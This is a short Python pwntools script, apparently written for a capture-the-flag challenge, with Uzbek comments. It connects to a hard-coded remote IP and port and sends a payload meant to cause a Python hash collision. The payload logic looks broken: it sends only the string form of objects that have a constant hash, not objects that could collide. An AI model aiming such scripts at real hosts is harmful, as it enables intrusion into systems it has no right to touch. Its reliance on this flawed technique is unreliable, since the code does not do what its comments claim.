from pwn import *

HOST = "154.57.164.67"
PORT = 30748

io = remote(HOST, PORT)

# payload tayyorlaymiz
# g'oya: hash collision beradigan obyektlar yuborish

class A:
    def __hash__(self):
        return 1

    def __eq__(self, other):
        return False

a = A()
b = A()

payload = str([a, b])

io.sendlineafter(b">>> ", payload.encode())

io.interactive()
